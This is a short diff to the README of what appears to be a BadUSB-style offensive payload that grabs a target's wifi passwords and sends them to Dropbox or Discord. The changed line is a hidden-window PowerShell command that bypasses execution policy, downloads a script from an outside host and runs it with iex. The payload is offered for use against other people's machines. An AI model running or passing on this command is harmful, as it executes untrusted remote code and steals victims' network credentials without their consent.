@@ -37,7 +37,7 @@ This payload grabs your target's wifi passwords and uploads them to either Dropb
 Fill in either or both of these to methods to exfil your collected data
 
 ```
-powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr jakoby.lol/e8v | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/e8v | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
